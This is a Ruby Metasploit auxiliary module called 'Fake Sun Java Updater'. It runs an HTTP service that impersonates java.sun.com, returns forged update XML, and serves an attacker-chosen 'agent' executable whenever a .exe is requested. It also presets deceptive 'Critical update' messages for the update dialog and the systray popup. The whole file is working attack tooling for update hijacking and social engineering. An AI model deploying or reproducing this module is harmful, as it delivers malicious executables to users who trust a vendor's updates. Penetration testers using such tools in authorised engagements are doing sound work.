require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Sun Java Updater',
			'Version'     => '1.0',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Sun Java updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)

		@base = {
			'vh' => ['java.sun.com'],
			'request' => [{
				'req' => '^/update/[.\d]+/map\-[.\d]+.xml', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '',
				'string' => '',
				'parse' => '',
				'file' => 'sunjava_map.xml'
			},
			{
				'req' => '^/java_update.xml$', 
				'type' => 'file', 
				'method' => '', 
				'bin'    => '',		    
				'string' => '',
				'parse' => 1,
				'file' => 'sunjava_update.xml'
			},
			{
				'req' => '.exe', 
				'type' => 'agent', 
				'bin'    => 1,
				'method' => '', 
				'string' => '',
				'parse' => '',
				'file' => ''
			}
			],
			'options' => {  
				'arg'    => { 
					'val' => '', 
					'desc' => 'Arg passed to Agent'
				},
				'name'  => { 
					'val' => 'RndAlpha(RndNum(1))',
					'hidden' => 1,
					'dynamic' =>1
				},                                                    
				'title'  => { 
					'val' => 'Critical update',
					'desc' => 'Title name displayed in the update'
				},
				'description' => { 
					'val' => 'This critical update fix internal vulnerability',
					'desc' => 'Description to be displayed during the update'
				},
				'atitle'  => { 
					'val' => 'Critical vulnerability',
					'desc' => 'Title name to be displayed in the systray item popup'
				},
				'adescription' => { 
					'val' => 'This critical update fix internal vulnerability',
					'desc' => 'Description  to be displayed in the systray item popup'
				},
				'website' => { 
					'val' => 'http://java.com/moreinfolink',
					'desc' => 'Website displayed in the update'
				}
			}
		}
	end
end
